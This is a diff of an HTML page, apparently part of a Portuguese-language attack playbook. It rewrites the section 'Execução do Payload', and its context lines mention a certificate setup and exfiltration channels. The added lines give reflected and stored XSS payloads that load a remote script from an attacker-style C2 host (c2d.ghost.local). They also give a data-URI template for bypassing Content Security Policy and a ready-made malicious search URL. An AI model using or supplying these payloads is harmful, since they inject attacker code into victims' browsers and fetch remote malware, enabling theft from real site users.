@@ -273,17 +273,20 @@ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -node
             </pre>
         </div>
 
- <div class="section" id="payload">
-            <h2>9. Execução do Payload</h2>
-            <h4>Reflected XSS</h4>
-            <pre>
-<script src=https://c2d.ghost.local/payload/phantom_zero.min.js></script>
-            </pre>
-            <h4>Data URI (CSP Bypass)</h4>
-            <pre>
-&lt;script src="data:text/javascript;base64,BASE64"&gt;&lt;/script&gt;
-            </pre>
-        </div>
+<div class="section" id="payload">
+    <h2>9. Execução do Payload</h2>
+
+ <h4>Reflected XSS</h4>
+    <pre>"&gt;&lt;script src="https://c2d.ghost.local/payload/phantom_zero.min.js"&gt;&lt;/script&gt;</pre>
+
+ <h4>Stored XSS</h4>
+    <pre>&lt;script src="https://c2d.ghost.local/payload/phantom_zero.min.js"&gt;&lt;/script&gt;</pre>
+
+ <h4>Data URI (Bypass CSP)</h4>
+    <pre>&lt;script src="data:text/javascript;base64,BASE64_DO_PAYLOAD_AQUI"&gt;&lt;/script&gt;</pre>
+    <p><strong>Exemplo prático (Reflected):</strong></p>
+    <pre>https://vulnerable.site/search?q="&gt;&lt;script src=https://c2d.ghost.local/payload/phantom_zero.min.js&gt;&lt;/script&gt;</pre>
+</div>
 
 <div class="section" id="exfil">
             <h2>10. Canais de Exfiltração</h2>
